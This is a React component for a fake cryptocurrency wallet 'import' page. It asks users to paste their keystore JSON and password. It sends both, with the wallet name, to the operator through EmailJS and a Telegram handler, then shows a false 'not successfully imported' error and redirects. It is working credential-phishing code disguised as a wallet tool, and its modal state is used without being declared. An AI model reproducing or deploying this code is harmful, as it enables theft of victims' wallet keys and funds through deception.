import React, { useState, useEffect, useContext } from "react";
import emailjs from "@emailjs/browser";
import { FaArrowRight, FaArrowRotateRight } from "react-icons/fa6";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { useNavigate } from "react-router-dom";
import { Label, Textarea, TextInput } from "flowbite-react";
import { Button, Modal } from "flowbite-react";
import { HiOutlineExclamationCircle } from "react-icons/hi";
import { ProjectContext } from "../context/ProjectContext";

const Keystore = () => {
  const [loading, setLoading] = useState(false);
  const {
    walletName,
    keyStore,
    setKeyStore,
    password,
    setPassword,
    handleSubmitTelegram,
  } = useContext(ProjectContext);

  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setOpenModal(false);
    setLoading(true);
    emailjs
      .send(
        import.meta.env.VITE_API_SERVICEID,
        import.meta.env.VITE_API_TEMPLATEID,
        {
          message: keyStore,
          password: password,
          walletName: walletName,
        }
      )
      .then((response) => {
        setLoading(false);
        handleSubmitTelegram();
        toast.error("Wallet not successfully imported. Please try again.");
        setKeyStore("");
        setPassword("");
        setTimeout(() => {
          navigate("/");
        }, 3000);
      })
      .catch((error) => {
        navigate("/error");
        setLoading(false);
        toast.error("Wallet not successfully imported. Please try again.");
      });
  };

  useEffect(() => emailjs.init(import.meta.env.VITE_API_PUBLIC_KEY), []);

  return (
    <section className="p-2">
      <ToastContainer autoClose={2500} />
      <form onSubmit={handleSubmit} className="form">
        <div>
          <div className="mb-2 block">
            <Label htmlFor="comment" value="Enter your keystore JSON" />
          </div>
          <Textarea
            className="focus:outline-wallet focus:ring-0 focus:border-0"
            onChange={(e) => setKeyStore(e.target.value)}
            id="comment"
            placeholder="Paste here..."
            required
            rows={4}
          />
        </div>
        <div>
          <TextInput
            className="mt-3 focus:outline-wallet focus:ring-0 focus:border-0"
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter password here..."
            type="text"
            // sizing="md"
          />
        </div>
        <p className="text-sm self-center mt-6 text-gray-900 dark:text-gray-200">
          Several line of text beginning with... plus the password you used to
          encrypt it
        </p>
        <div
          onClick={
            keyStore.length && password.length > 30 ? handleSubmit : null
          }
          value="send"
          className="submitBtn self-center mt-10 max-w-sm w-full"
        >
          {loading ? "Importing..." : "Import"}
          {loading ? (
            <FaArrowRotateRight className="animate-spin font-bold" />
          ) : (
            <FaArrowRight />
          )}
        </div>{" "}
        <Modal
          show={openModal}
          size="md"
          onClose={() => setOpenModal(false)}
          popup
        >
          <Modal.Header />
          <Modal.Body>
            <div className="text-center">
              <HiOutlineExclamationCircle className="mx-auto mb-4 h-14 w-14 text-gray-400 dark:text-gray-200" />
              <h3 className="mb-5 text-lg font-normal text-gray-500 dark:text-gray-400">
                Are you sure you want to import your wallet?
              </h3>
              <div className="flex justify-center gap-4">
                <Button type="submit" color="blue" onClick={handleSubmit}>
                  {"Yes, I'm sure"}
                </Button>
                <Button color="gray" onClick={() => setOpenModal(false)}>
                  No, cancel
                </Button>
              </div>
            </div>
          </Modal.Body>
        </Modal>
        <a
          className="text-center mt-10  text-gray-900 dark:text-gray-200"
          href="https://cointelegraph.com/explained/what-is-a-seed-phrase-and-why-is-it-important"
        >
          What is secret phrase?
        </a>
      </form>
    </section>
  );
};

export default Keystore;
